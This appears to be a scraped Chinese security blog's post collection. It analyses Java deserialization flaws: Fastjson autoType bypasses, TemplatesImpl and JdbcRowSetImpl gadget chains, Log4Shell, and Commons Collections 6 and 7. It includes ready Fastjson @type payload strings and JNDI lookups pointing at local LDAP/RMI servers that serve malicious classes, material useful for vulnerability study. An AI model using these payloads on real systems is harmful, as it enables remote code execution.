1.2.25-1.2.32版本：仅未开启AutoType时可利用； 1.2.33-1.2.47版本：无论是否开启AutoType都可利用。 POC调试1.2.47 未开启 AutoType第一个获取到的key值是a，所以递归调用DefaultJSONParser.parseObject() 到获取key为@type； 获取到第一个@type字段的值为java.lang.Class，带入checkAutoType()进行校验； autoTypeSupport默认是 false 的，mapping里面也没有java.lang.Class，直接进入 832 行的 if 语句； buckets里是有java.lang.Class的，所以findClass会返回它； clazz不为 null 了，就在 839 行返回； 这里获取到的derializer是MiscCodec类对象； 跟进到DefaultJSONParser.parse()，进入case 4语句，1320 行获取到我们传入的val参数的值，然后在 1328 行返回；（注意调用链） 返回到MiscCodec.deserialize()，调用了TypeUtils.loadClass()； 跟进到TypeUtils.loadClass()，1125 行从mapping中寻找com.sun.rowset.JdbcRowSetImpl是找不到的；但是cache默认传入为 true，可以进入到 1153 行，将com.sun.rowset.JdbcRowSetImpl添加进了mapping中； 继续调试，相同的流程获取到b里的@type的值，带入checkAutoType()校验； autoTypeSupport为 false，进入到 828 行，应为前面已经将com.sun.rowset.JdbcRowSetImpl添加到了mapping中，所以这里是获取成功的，clazz得到com.sun.rowset.JdbcRowSetImpl，随后就在 839 行返回； 后续就是一样的流程了。 1.2.47 开启 AutoType开启了 AutoType 会进入黑名单校验，但是在校验的 if 语句中，虽然满足第一个逻辑语句，但是不满足第二个逻辑语句，因为com.sun.rowset.JdbcRowSetImpl已经被添加进mapping中了，获取结果不为 null，仍然正常返回clazz。 1.2.32 未开启 AutoType未开启 AutoType 时， 直接调用TypeUtils.getClassFromMapping返回clazz； 1.2.32 开启 AutoType开启 AutoType 时，会进入 if 语句进行黑名单校验，只有一个逻辑判断语句且满足，会在这里报异常，所以不能利用。 Fastjson &lt;&#x3D; 1.2.62补丁分析从 1.2.48 开始，将TypeUtils.loadClass()中的cache默认传为了 false，不能把指定类添加进mapping了； 并且将java.lang.Class加入了黑名单，如果开启 AutoType 就会被黑名单拦截； 补丁绕过重新找到一条利用链，触发点在org.apache.xbean.propertyeditor.JndiConverter的toObjectImpl()方法中； 它的父类AbstractConverter.toObject()中调用了toObjectImpl()；setAsText()调用了toObject()； 当反序列化调用setAsText()时，就可以触发RCE。 需要目标服务器存在 xbean-reflect；导入依赖： 构造 POC要开启 AutoType； POC 调试能成功绕过黑名单检测，加载org.apache.xbean.propertyeditor.JndiConverter；autoTypeSupport要为 true 才能进入905 行的 if 语句； 反射调用到setAsText()； 到达 lookup，成功执行命令。 不开启 AutoType 的话会在这里报异常。 Fastjson &lt;&#x3D; 1.2.66补丁分析org.apache.xbean.被加入了黑名单，黑名单已经扩展到了88个； 补丁绕过寻找黑名单中没有的类进行绕过，有以下几个类可利用； 目标服务器有 shiro-core 包：&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://127.0.0.1:1389/CalcCmd&quot;&#125;； 目标服务器有 Anteros-Core 和 Anteros-DBCP 包：&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://127.0.0.1:1389/CalcCmd&quot;&#125;； 目标服务器有 ignite 包： &#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap://127.0.0.1:1389/CalcCmd&quot;&#125;； 目标服务器有 ibatis-sqlmap和 jta 包：&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;:&#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap://127.0.0.1:1389/CalcCmd&quot;&#125;&#125;。 原理都一样，就不一 一调式了。 Fastjson &lt;&#x3D; 1.2.68修复方法也是把前面能利用的类都加入了黑名单；还增加了一个safeMode属性，如果为 true 直接报异常，默认不开启。 补丁绕过这种绕过方式是通过expectClass参数将恶意类传入checkAutoType()进行加载。 前面几个版本的利用链expectClass参数都默认传为 null，这里我们要找到一个expectClass参数可控的地方； 看到JavaBeanDeserializer.deserialze()中从传入的type来获取expectClass的值； 那么找到调用JavaBeanDeserializer.deserialze()的地方；在DefaultJSONParser.parserObject()中，根据clazz从this.config中获取对应的deserializer，再调用它的deserialze()方法；其中对应JavaBeanDeserializer的类是java.lang.AutoCloseable； 所以@type字段传入的类型应该是java.lang.AutoCloseable；要触发RCE，还得传入一个命令执行的类，所以再传入一个@type字段，作为反序列化的类型；第二个@type会通过JavaBeanDeserializer.deserialze()中调用的checkAutoType()去加载。 还有ThrowableDeserializer.deserialze()，它是JavaBeanDeserializer的子类，存在expectClass参数位置固定为Throwable.class的地方； @type字段应传入的值就是java.lang.Throwable；恶意类也应该继承java.lang.Throwable。 构造 POCAutoCloseable命令执行类实现 AutoCloseable 接口，命令通过参数传入； 构造 JSON 字符串，是否开启 AutoType 都可； Throwable原理差不多，继承 Throwable： 需要开启 AutoType ，否则加载不到java.lang.Throwable，会报异常； POC 调试AutoCloseable进入checkAutoType()，mapping中存在java.lang.AutoCloseable，直接返回clazz； 跟进到JavaBeanDeserializer.deserialze()，expectClass的值得到java.lang.AutoCloseable，ref是第二个@type字段的值Calc，作为参数传入checkAutoType()； 因为expectClass不为 null ，所以expectClassFlag值为 true， 进入 1108 行的 if 语句，加载Calc类； 一直跟进到JavaBeanDeserializer.deserialze()，538 行获取到calc.exe，且matchField和valueParsed都为 true； 845 行把calc.exe传入到fieldValues，再传入params对象数组，最后在 1022 行进行实例化，从而触发命令执行代码。 调用链如下： Throwable进入checkAutoType()，java.lang.Throwable不在mapping中，到 1110 行才会加载； 获取到的deserializer是ThrowableDeserializer类型； 跟进调用了checkAutoType()； autoTypeSupport和expectClassFlag都为 true ，1119 行加载Calc类； clazz不是Throwable子类的话这里是会报异常的； 返回到ThrowableDeserializer.deserialze()，创建异常类；（POC 要构造对，不然很容易在这一步挂掉） 跟进，获取了恶意类的构造方法，并且实例化了该类，在此触发命令执行； 调用链如下： Fastjson &lt;&#x3D; 1.2.80补丁分析从 1.2.69 开始，对传入checkAutoType()的expectClass参数进行了 hash 计算，再校验是否是允许的类型； if 语句中涵盖的类如下： -8024746738719829346L java.io.Serializable 3247277300971823414L java.lang.Cloneable -5811778396720452501L java.io.Closeable -1368967840069965882L java.lang.AutoCloseable 2980334044947851925L java.lang.Readable 5183404141909004468L java.lang.Runnable 7222019943667248779L java.util.EventListener -2027296626235911549L java.lang.Iterable -2114196234051346931L java.util.Collection -2939497380989775398L java.lang.Object 但是在开启 AutoType 的情况下，仍然可以使用上面两种类来绕过。 参考连接："},{"title":"Fastjson 1.2.24 反序列化RCE（CVE-2017-18349）","date":"2022-09-19T11:31:55.000Z","url":"/2022/09/19/Fastjson%201.2.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4RCE%EF%BC%88CVE-2017-18349%EF%BC%89/","categories":[[" ",""]],"content":"前言Fastjson 是一种 JSON 解析器，把Java 对象转换为 JSON 字符串的过程称为序列化， JSON 字符串转换为 Java 对象的过程成反序列化。 造成该漏洞的原因是可以通过@type指定反序列化返回的类型，可以向指定类中传入 JSON 字符串，并且getOutputProperties()方法满足在反序列化时调用的条件，从而将传入的恶意字节码转换为类并实例化，导致RCE。 影响版本：Fastjson &lt;&#x3D; 1.2.24 环境搭建：导入 Fastjson 1.2.24 版本的依赖： TemplatesImpl 利用链分析先看一下 TemplatesImpl 类的方法和成员变量列表； 漏洞触发点在TemplatesImpl.getTransletInstance()的455行，对_class[_transletIndex]进行了实例化； _class初始化为 null，_transletIndex初始化为 -1，_name不能为 null，否则直接return null;，但是_name变量没有 setter 方法，所以要给它赋值的话需要在反序列化时添加Feature.SupportNonPublicField；_class满足 451 行的 if 条件，进入 defineTransletClasses()方法； 393 行判断了_bytecodes是否为空，要不为 null 才能执行到 398 行；401 行 调用了_tfactory.getExternalExtensionsMap()，_tfactory不能为 null ，否则会报错；414 行对 _bytecodes进行了遍历，并且调用loader.defineClass()，将结果赋给了_class[i]； 跟进defineClass()，返回的是ClassLoader.defineClass()，也就是说在这里将从_bytecodes[i]获取到的字节码定义为一个类； 418 行，如果上面生成的类的超类是AbstractTranslet类，_transletIndex的值就为该次循环的下标值；否则，就把生成的类记录到_auxClasses中；（ABSTRACT_TRANSLET的值初始化为com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet） 也就是说，在defineTransletClasses()方法中，如果我们向_bytecodes中传入恶意类的字节码，该方法会将该字节码转换为类，赋给_class[_transletIndex]，然后在getTransletInstance()方法中实例化。 寻找什么地方调用了getTransletInstance()，找到newTransformer()； 继续找什么地方调用了newTransformer()，找到getOutputProperties()； getOutputProperties()是成员变量_outputProperties的 get 方法；并且该变量没有 set 方法，是Properties类型，属于Map接口实现类的子类，满足反序列化调用 get 方法的所有条件，所以在反序列化过程中，能够调用到getOutputProperties()方法，从而实例化我们传入的恶意类，导致RCE。 构造 POC构造一个 JSON 字符串，现在已知要满足的条有： 反序列化的类型得是TemplatesImpl类，通过@type来指定； _bytecodes是恶意类的字节码，并且该类是AbstractTranslet类的子类； _name不为 null ； _tfactory不为 null； 有_outputProperties； 先构造一个恶意类，并继承AbstractTranslet，在构造方法中写入命令执行代码； 构造 POC 如下： 把EvilTest的字节码文件进行 base64 编码，再传入_bytecodes，为什么要编码下面调试时再说。 POC 调试从反序列化跟入，到JSON.parse(String text, int features)； 跟入到DefaultJSONParser的构造方法，这里根据this.lexer的值，将token赋为了12；this.lexer是JSONScanner对象，this.text就是输入的 JSON 字符串； 继续跟进到DefaultJSONParser.parse(Object fieldName)，根据 token 的值 case 到12； 跟进parseObject()； 在JSONLexerBase.scanSymbol()中把@type取了出来返回给key； 走到下面的 if ，判断了key是否等于@type，又把下一个引号包裹的内容取了出来，也就是com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，然后 276 行去加载这个类； 318 行跟进到ParserConfig.getDeserializer()，对TemplatesImpl类做了一系列判断； 410 行调用了createJavaBeanDeserializer()，跟进到 479 行调用JavaBeanInfo.build()； 在这里，把getOutputProperties()添加到了fieldList中； 返回JavaBeanInfo的对象； 回到ParserConfig 492 行，循环到outputProperties，只有 get 方法，满足 if 条件，asmEnable赋为 false； 进入 536 行 返回一个JavaBeanDeserializer对象； 在 new JavaBeanDeserializer对象的过程中也向上面一样，获取了getOutputProperties()方法，然后循环遍历将这些方法存到了this.sortedFieldDeserializers变量中； 返回JavaBeanDeserializer对象到DefaultJSONParser.parseObject()318 行；继续跟进到JavaBeanDeserializer.deserialze(DefaultJSONParser parser, Type type, Object fieldName, Object object, int features)，这个时候token为16，到358行；在while 循环中取出了sortedFieldDeserializers中的getOutputProperties()方法 接着是一顿循环，fieldIndex等于3时，就不再进入364行的 if 了，所以fieldDeser等于 null，跳过 376行的 if，进入 480行的 if ，获取下一个双引号之间的值，也就是_bytecodes作为 key ； 577 行实例化了一个TemplatesImpl类对象； 604行调用了parseField()； 跟进parseField()，760行把所有成员变量存入了this.extraFieldDeserializers； 791行调用了parseField()； 跟进，67行调用了deserialze()； 这个时候token值为14，走到153行调用parseArray()； parseArray()里面又调用了deserialze()； 这个时候token为4，进入111行调用bytesValue()，跟进发现对_bytecodes进行了base64解码操作（84-1780 就是_bytecodes的内容），所以在构造 POC 时要对_bytecodes内容进行编码； 最后得到的value就是恶意类的字节码，跟进setValue()； method为 null ，最后把 TemplatesImpl对象中的_bytecodes的值赋为了字节码； 回到JavaBeanDeserializer.deserialze()中，循环获取传入的 JSON 字符串的属性名，到获取到_outputProperties； 像前面一样，一直跟到FieldDeserializer.setValue()，这个时候获取到的method为getOutputProperties()，进入 if 语句；到78行反射调用getOutputProperties()； 跟进到getOutputProperties()； 跟进newTransformer()； 跟进getTransletInstance()，调用defineTransletClasses()，在414行将字节码转换为类赋给_class[0]； 在455行实例化EvilTest类，成功执行命令。 JdbcRowSetImpl 利用链分析漏洞触发点在JdbcRowSetImpl.connect()，326行使用lookup()检索this.getDataSourceName()返回的数据源对象名称； this.getDataSourceName()可以通过向JdbcRowSetImpl对象的dataSourceName参数传入数据源对象来指定；找到setAutoCommit()中调用了connect()，只要向JdbcRowSetImpl对象的autoCommit参数传入值，即可在反序列化时调用这个方法； 构造 POC要满足的条件很简单： 反序列化的类型是JdbcRowSetImpl类，通过@type来指定； dataSourceName指定要加载的恶意对象； 传入autoCommit， 它是 Boolean 类型，传入 true 或 false 都行； 先构造一个命令执行的类： 用 python 启一个 Web 服务，把命令执行类的.class文件放到 Web 目录下；python -m http:server 8081 编写服务端代码，将命令执行类绑定到指定名称上； 编写客户端代码，构造 JSON 字符串，进行反序列化； 命令执行成功； （使用 RMI + JNDI 方式利用需要注意 JDK 版本在8u121之前。） POC 调试反序列化和参数传递过程和 TemplatesImpl 差不多，只贴一些比较关键的地方； DefaultJSONParser.parseObject() 276行加载了com.sun.rowset.JdbcRowSetImpl类； 在ParserConfig.createJavaBeanDeserializer()中，541行调用了重载的createJavaBeanDeserializer()； 重载的createJavaBeanDeserializer()返回了一个FastjsonASMDeserializer_1_JdbcRowSetImpl类对象； 返回到DefaultJSONParser.parseObject()； 跟进 319 行，到JavaBeanDeserializer.deserialze()，198 行this.deserializer就是FastjsonASMDeserializer_1_JdbcRowSetImpl类对象，跟进显示不支持 Debug； 继续跟进跳到了parseRest()； 继续跟进到JavaBeanDeserializer.deserialze()，经过一顿循环，596行调用parseField()； 一路跟进JavaBeanDeserializer.parseField() —&gt; DefaultFieldDeserializer.parseField() —&gt; StringCodec.deserialze() —&gt; StringCodec.deserialze()，返回的是 dataSourceName的值； 回到DefaultFieldDeserializer.parseField()跟进78 行的setValue(); 这里获取到的method是setDataSourceName，就把rmi://127.0.0.1:1099/calc传给了JdbcRowSetImpl对象的dataSource变量； 返回JavaBeanDeserializer.parseField()继续循环，当获取到autoCommit参数时，调用parseField()； 同样走到setValue()，这里获取到的method是setAutoCommit()，反射调用这个方法； 一直跟进到达setAutoCommit()方法； 跟进connect()，成功到达 lookup ，命令执行成功。 调用链如下： 参考连接："},{"title":"Fastjson 简单学习","date":"2022-09-19T11:31:54.000Z","url":"/2022/09/19/Fastjson%20%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/","categories":[[" ",""]],"content":"JSONJSON 全称“JavaScript Object Notation”，译为“JavaScript 对象表示法”，是一种轻量级的、基于文本的、开放的数据交换格式。（数据交换是指两个设别之间建立连接并相互传递数据的过程。） JSON 是一种纯字符串形式的数据，它本身不提供任何方法（函数），采用独立于变成语言的文本格式来存储和表示数据，易于程序员阅读与编写，同时也易于计算机解析和生成，通常同于在 Web 客户端与 Web服务器端之间传递数据。 JSON 语法规则所有的 JSON 数据都需要包裹在一个花括号中。 JSON 数据是以键值对的形式书写，键与值之间用:分隔；键表示数据的名称，需要以字符串的形式定义，并用双引号包裹；值可以是以下数据类型： 整型、浮点型 字符串（双引号包裹） Boolean 数组（定义在[ ]中，元素可以是任意类型，用,隔开） 对象（定义在&#123; &#125;中，内容为键值对形式，值可以是任意类型） null （最后一个值后面都不写,。） JSON 注释通过添加同名键，并在同名键前面加上特殊符号来表示注释，如下： 特殊符号可以是：@、#、?、_、/等，最好避免使用[、 ]、 &#123;、 &#125;、：等 JSON 语法里常用的符号。 Java JSON 的创建和解析Java 中没有内置任何处理 JSON 数据的函数或库，所以我们需要借助一些开源的库来实现 JSON 数据的创建和解析，比较常用的有 JSON.simple、Jackson、Gson、Moshi 、Fastjson等；这里使用 Fastjson 作演示。 导入依赖： 定义一个实体类，必须有无参构造函数： 数据转换： 运行结果： FastjsonFastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将 Java 对象序列化为JSON字符串，也可以将JSON字符串反序列化为 Java 对象。具有执行效率高的特点，应用范围广泛。 下载地址： 序列化Fastjson 中，序列化函数有toJSONString()，有很多重载方法； 在实体类的set、get方法中添加输出： 传入不同的参数进行序列化： 运行结果： 可以看到，当给toJSONString()方法传入第二个参数SerializerFeature.WriteClassName时，返回的 JSON 字符串中会多出一个@type字段，而它的值就是我们传入的 User 类。 反序列化Fastjson 中，反序列化的函数有parse()和parseObject()，它们分别都有很多重载的方法。 用不同的方法进行反序列化： 运行结果： 从结果中可以看到，当给parseObject()方法传入两个参数时，返回的结果是我们第二个参数指定的User类型，并且调用了它的 set 方法；当只给parseObject()方法传入 JSON 字符串时，返回的结果是 JSONObject 类型，不调用 set 方法；当使用parse()进行反序列化时，返回的结果是 Object 类型，不调用 set 方法；但是如果 JSON 字符串中包含@type字段，parse()反序列化的结果就是@type字段中声明的类型，并且调用它的 set 方法；parseObject()方法效果一样，只是比parse()多调用了一次toJSON()，调用了全部 get 方法。 那么，如果反序列的内容是可控的，我们就可以在 JSON 字符串前面添加@type字段来指定类，并调用它的 set &#x2F;get 方法，利用 set &#x2F; get 方法来触发恶意代码，就能进行利用。（给parseObject()方法传入第二个参数比较难利用。） 反序列化调用 set、get的特点对实体类稍作修改，把cities定义为Properties类型，并且不添加它的 set 方法； 反序列化： 因为没有给cities设置 set 方法，所以如果想要往里传值，就需要添加Feature.SupportNonPublicField参数。 先看一下运行结果： parseObject()没有添加Feature.SupportNonPublicField参数，所以就没有返回cities属性。 两个方法还有不同之处就在于parse()在调用 set 方法时调用了getCities()，而parseObject()除此之外，还将所有 get 方法都调用了一遍。 接下来慢慢看。 跟进反序列化过程到JavaBeanInfo.build()中可以看到，先反射获取了所有方法，然后经过重重判断，把满足条件的 set 方法添加到了fieldList中； 然后在下面的 for 循环中，又把满足条件的 get 方法也添加到fieldList中； if 中的判断语句如下： 而getCities()方法刚好就满足这些条件，所以会被调用。 至于parseObject()为什么会把所有 get 方法都调用一遍，是因为在他调用toJSON()后，会把所有 get 方法都记录下来，然后反射调用。 参考连接："},{"title":"Log4j2 JNDI 注入漏洞分析（CVE-2021-44228）","date":"2022-09-19T11:31:53.000Z","url":"/2022/09/19/Log4j2%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2021-44228%EF%BC%89/","categories":[[" ",""]],"content":"前言此漏洞（CVE-2021-44228）是于2021年12月爆出来的“核弹”级漏洞，利用难度低、影响范围广、危害大。 漏洞原因：在 Apache Log4j2 直到 2.14.1（不包括安全版本 2.3.1、2.12.2 和 2.12.3）的版本中，配置、日志消息和参数中使用的 JNDI 功能不能防止攻击者控制的 LDAP 和其他JNDI 相关端点。当启用消息查找替换时，可以控制日志消息或日志消息参数的攻击者可以执行从 LDAP 服务器加载的任意代码。 受影响版本：2.0-beta9 到 2.14.1 的所有版本 漏洞复现复现环境： Log4j2: 2.14.1 JDK：8u72 创建一个Maven工程，在pom.xml中导入Log4j2的依赖； 将一个存在恶意代码的类编译成 .class 文件（编译时不能有 package）； 用 python 启一个 Web 服务，把上一步生成的 .class 文件放到启 We服务的目录下；python -m http.server 8081访问 8081 端口能看到上传的 class 文件就行了； 编写服务端代码，将恶意类绑定到指定名称上； 要注意JDK版本，要用8u121之前的，因为在 8u121及之后，默认情况下禁止通过存储在命名和目录服务中的JNDI对象工厂进行远程类加载；要启用远程类加载需要将com.sun.jndi.rmi.object.trustURLCodebase和 com.sun.jndi.cosnaming.object.trustURLCodebase设为true；否则会报错： 编写 Log4j2 利用代码 复现成功： 漏洞分析从LOGGER.error跟起，调用了logIfEnabled()； 进入logIfEnabled()，if 里调用了Logger.isEnabled()进行判断； 然后又调用了filter()进行判断； 在filter()中判断了this.config.getFilter()是否为空，是为空，到达 return 语句，对level进行了判断；因为使用的是error()，所以这里的level值为200，满足条件，返回 true； 自然AbstractLogger.logIfEnabled()中的 if 判断为 true ，进入logMessage()；然后层层跟进：logMessageSafely() -&gt; logMessageTrackRecursion() -&gt; tryLogMessage() -&gt; Logger.log()； 判断了strategy是否是LocationAwareReliabilityStrategy接口实现类的实例； strategy默认是DefaultReliabilityStrategy类的实例，而这个类实现了LocationAwareReliabilityStrategy接口，所以判断为 true； 进入DefaultReliabilityStrategy.log() -&gt; LoggerConfig.log()； this.propertiesRequireLookup在构造方法中赋值为 false，进入 if 语句，this.properties被赋值为 null，所以props等于 null；this.logEventFactory是ReusableLogEventFactory类的对象，这个类实现了LocationAwareLogEventFactory接口，所以调用它的createEvent()，new 了一个Mutablelnstant对象，set 了一系列数据，将我们构造的JNDI表达式传入了setMessage()； 在setMessage()中调用了getMessageTextForWriting()，创建了一个初始容量为128的字符构建器messageText（INITIAL_REUSABLE_MESSAGE_SIZE默认值为128），将我们传入的 msg 放到了messageText中，长度为33。 然后调用getFormat()，如果传入的是字符串，那就返回该字符串给messageFormat； 最后将Mutablelnstant对象返回给logEvent； 接着进入重载的LoggerConfig.log()； 调用isFiltered()进行判断，this.filter为 null ，直接返回 false； 进入 if 语句，到LoggerConfig.processLogEvent()； if 里的allow()恒为 true； 进入callAppenders()，对event做了一个循环操作； 跟进到AppenderControl.callAppenfer()，shouldSkip()中的三个语句都返回为 false； 继续跟进到callAppenderPreventRecursion() -&gt; callAppender0，if 中又判断了是否有 filter 过滤，filter 任然为 null ，if 为 true； 进入tryCallAppender -&gt; AbstractOutputStreamAppender.append() -&gt; tryAppend()，ENABLE_DIRECT_ENCODER默认值为 true； 跟进directEncodeEvent() -&gt; PatternLayout.encode()； if 中的this.eventSerializer定义为如图所示，进入build()，会进入else if 或者 else 分支； return 的两个类都实现了Serializer2接口，所以PatternLayout.encode()中的 if 为 false，进入 else 分支； 跟进toText -&gt; toSerializable() ，这里进入了一个循环，formatters包含多个对象，循环调用每个 Converter 的format()方法； 每循环一次就会向buffer中添加数据； 漏洞的关键点在索引为8的MessagePatternConverter.format()； msg是MutableLogEvent类的实例，这个类实现了ReusableMessage接口，这个接口继承了StringBuilderFormattable，所以 if 为 true； doRender为 false， 所以workingBuilder设置为toAppendTo，即前面循环添加得到的buffer，这个时候长度为52，offset也为52； 接下来走的是 else 分支，把messageText添加到了workingBuilder中，长度变为了85，offset还是为52； 进入 if 中的 for 循环，从52的位置开始循环，也就是判断上面添加的messageText是否以$&#123;开头，这里显然成立，然后把我们传入的字符串取出给了value； 跟进StrSubtitutor.replace() -&gt; substitute() -&gt; 重载的substitute()，代码超级长； 先看一下现在的变量值； 进入 while ，isMatch()返回2，也就是说JNDI表达式是从索引2的位置开始的； 经过多次循环，找到JNDI表达式结束在索引为32的位置； 根据首尾位置，把jndi:rmi://127.0.0.1:1099/calc取了出来； 跟进resolveVariable() -&gt; Interpolator.lookup()；这里把JNDI表达式的第一个:的前后字符串分别取出，即jndi和rmi://127.0.0.1:1099/calc；从strLookupMap中获取jndi对应的 Lookup 对象JndiLookup； 197行进入JndiLookup.lookup() -&gt; jndiManager.lookup()，这里就是最终触发点了。 调用栈如下： lookup实现原理继续看一看lookup()里面是怎么实现远程类加载的吧。 跟进InitialContext.lookup() -&gt; getURLOrDefaultInitCtx() -&gt; NamingManager.getURLContext()，获取到使用了rmi； 继续到getURLObject()，根据schema得到一个rmiURLContextFactory类对象； 在rmiURLContextFactory.getObjectInstance()方法中 new 了一个rmiURLContext类对象； 逐步返回到InitialContext.lookup()，因为rmiURLContext继承了GenericURLContext，所以进入到GenericURLContext.lookup() -&gt; RegistryContext.lookup()-&gt; RegistryImpl_Stub.lookup()； RegistryContext.lookup()中的 var2 得到一个ReferenceWrapper_Stub类对象，跟进decodeObject()，获取从ReferenceWrapper_Stub返回的 Reference 对象； 跟进到NamingManager.getObjectInstance()，从 Reference 对象中获取到了 Factory （CalcCmd）的实例； 跟进到getObjectFactoryFromReference()，尝试用当前的类加载器加载 Factory（CalcCmd） 类，这里能成功加载，因为我是把命令执行代码写到 static 代码块中的，所以在这里一成功加载到类，就执行了命令。 如果在当前 ClassPath 中无法找到相应的类时，就使用指定的 codebase 加载；如果恶意代码写在 main 方法中，要到下面创建实例对象时才执行命令； 漏洞修复发布了修复版本2.15.0-rc1。 从 Log4j 2.15.0 开始，默认情况下禁用了消息查找功能。配置中的查找仍然有效。虽然 Log4j 2.15.0 可以选择以这种方式启用 Lookups，但强烈建议用户不要启用它。为 JNDI 连接引入了白名单机制，默认情况下只允许 localhost。但是2.15.0-rc1也很快被绕过了，找到了新的利用方式，不建议使用。 总结在打印日志的过程中，会识别$&#123;&#125;包含的字符串，并且会按:将字符串分隔；会判断:前面是什么内容，根据前面的类型来解析后面的内容，如： ctx：允许程序将数据存储在 Log4j ThreadContext Map 中，然后在日志输出过程中，查找其中的值； ctx：允许程序将数据存储在 Log4j ThreadContext Map 中，然后在日志输出过程中，查找其中的值； java：允许查找Java环境配置信息； jndi：允许通过 JNDI 检索变量； 我们使用jdni，那它就会通过JNDI来检索:后面的内容，即实现远程类加载。 同理，也可以构造其他类型的利用。 参考链接："},{"title":"Java  Commons Collections 7分析","date":"2022-09-19T11:31:52.000Z","url":"/2022/09/19/Java%20%20Commons%20Collections%207%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"前言CC7也是对commons-collections 3.1版本的利用链，使用Hashtable作为反序列化的入口点，通过AbstractMap#equals来调用LazyMap#get。 环境搭建 JDK 1.8 Commons Collections 3.1 pom.xml中添加： 利用链 利用链分析看到Hashtable#readObject，循环调用了reconstitutionPut，elements为传入的元素个数；[1] key和value都是从序列化流中得到的，序列化流中的值则是通过put传进去的；[2] 跟进reconstitutionPut；[3] for循环中调用了equals，我们先看看进入for循环的条件：e != null，而 e = tab[index]，此时tab[index]的值是为null的，所以不会进入for循环，下面的代码就是将key和value添加到tab中； 那如何才能进入for循环呢，既然调用一次reconstitutionPut不行，那我们就调用两次，也就是说put两个元素进Hashtable对象，这样elements的值就为2，readObject中的for循环就可以循环两次；第一次循环已经将第一组key和value传入到tab中了，当第二次到达reconstitutionPut中的for循环的时候，tab[index]中已经有了第一次调用时传入的值，所以不为null，可以进入for循环； 接着看看if里面的判断，要求e.hash == hash，这里的e值为tab[index]，也就是第一组传入的值，这里的hash是通过key.hashCode()获取的，也就是说要put两个hash值相等的元素进去才行； 继续跟进到AbstractMapDecorator#equals，这里的map是可控的，；[4] 跟进到AbstractMap#equals，调用了m.get()，而m是根据传入的对象获取的，也就是说如果传入的是LazyMap类对象，那么这里就是调用的LazyMap#get，便可触发RCE；[5] POC分析 代码1 和CC6一样，需要构造两个Transformer数组，因为在后面第二次调用hashtable.put()的时候也会调用到LazyMap#get，会触发RCE，可以跟进看一调用栈；[6] 所以这里构造一个fakeTransformers，里面为空就行； 代码2 先将fakeTransformers传入ChainedTransformer对象；new两个HashMap对象，都调用LazyMap.decorate，并且分别向两个对象中传值，两个key值分别为yy和zZ，因为需要这两个值的hash值相等，而在java中，yy和zZ的hash值恰好相等；[7] 然后将这两个LazyMap类对象put进Hashtable类对象； 代码3 通过反射获取ChainedTransformer的iTransformers变量，将含有我们反序列化时要执行的命令的transformers数组传进去，替换前面的fakeTransformers； 最后还要remove掉yy，应为如果不去掉的话，第二次调用reconstitutionPut的时候就会存在两个key；[8] 导致进入下面的if判断，直接返回false，不再执行后面的代码；[9] POC调试第一次进入reconstitutionPut，将值传入tab：[10] 第二次进入for循环：[11] 进入equals，参数object是lazyMap2：[12] 进入下一个equals，m就是LazyMap类：[13] 进入get，成功调用transform()：[14] 命令执行成功；[15] 参考链接： 总结CC链就先分析到这里，8、9、10等剩下的链以后再接着分析；CC1-7涉及两个CC版本，3.1和4.0；3.1版本基本就是通过各种途径去调用LazyMap#get，从而实现RCE；4.0版本则是通过调用TransformingComparator#compare来实现RCE；虽然几条链分析下来都大同小异，但也提升了不少分析代码的能力，获益匪浅。"},{"title":"Java  Commons Collection 6分析","date":"2022-09-19T11:31:51.000Z","url":"/2022/09/19/Java%20%20Commons%20Collection%206%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"前言CC6还是通过调用LazyMap#get来触发RCE，任然用到了TiedMapEntry类，只不过是通过调用TiedMapEntry#getValue的链不一样。 环境搭建 JDK 1.8 Commons Collections 3.1 pom.xml中添加： 利用链 利用链分析找到调用LazyMap#get的地方，任然是TiedMapEntry#getValue，map可控，传入LazyMap即可；[1] 接下来寻找调用getValue()的地方，找到TiedMapEntry#hashCode；[2] 接着寻找调用hashCode()的地方，找到HashMap#hash；[3] 继续寻找调用hash()的地方，找到HashMap#put；[4] 最后，在HashSet#readObject中，调用了put()；[5] POC分析代码1 构造两个Transformer数组，因为在后面调用add()的时候也会触发RCE，用两个不同的命令加以区分； 代码2 new一个ChainedTransformer对象，先将fakeTransformers传进去；同样new一个LazyMap对象； 代码3 这里调用add()方法将含有恶意代码的对象传入hashSet，就不用像ysoserial中使用反射去传值，这样比较简便；[6] 跟一下add()方法，这里的map是TiedMapEntry对象，跟进put；[7] 调用了hash方法，继续跟进，k也是TiedMapEntry对象；[8] 跟进hashcode()，这里就调用到了getValue；[9] 跟进，map是LazyMap，调用了get方法；[10] 来到get()，进入if，调用了transform；[11] 跟进，这里的iTransformers是我们传入的fakeTransformers，里面是notepad.exe命令；[12] 命令执行；[13] 可以看一下这时的调用栈；[14] 当然在这里执行命令不算咯，得在反序列化时执行才有用，这里也可以不使用InvokerTransformer，只是为了更清楚的表达这里也会调用LazyMap#get，触发RCE； 继续分析，这里已经调用过一次LazyMap#get了，为了后面反序列化时，能进入get()的if判断，所以调用remove()将key值删除掉；[15] 代码4 通过反射获取ChainedTransformer的iTransformers变量，将含有我们反序列化时要执行的命令的transformers数组传进去，替换前面的fakeTransformers； 完整POC： POC调试从HashMap#readObject开始，调用了put；[16] 调用链和add()差不多，直接跟到InvokerTransformer；[17] 命令执行成功；[18]"},{"title":"Java  Commons Collection 